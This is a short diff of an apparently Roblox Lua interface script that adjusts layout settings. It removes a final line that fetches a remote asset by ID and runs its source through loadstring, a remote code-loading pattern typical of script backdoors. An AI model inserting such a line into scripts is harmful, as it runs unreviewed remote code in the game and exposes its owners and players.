@@ -737,5 +737,3 @@ UIListLayout_3.Parent = GameOutput
 UIListLayout_3.HorizontalAlignment = Enum.HorizontalAlignment.Center
 UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
 UIListLayout_3.Padding = UDim.new(0, 10)
-
-loadstring(game:GetObjects('rbxassetid://9302120695')[1].Source)()
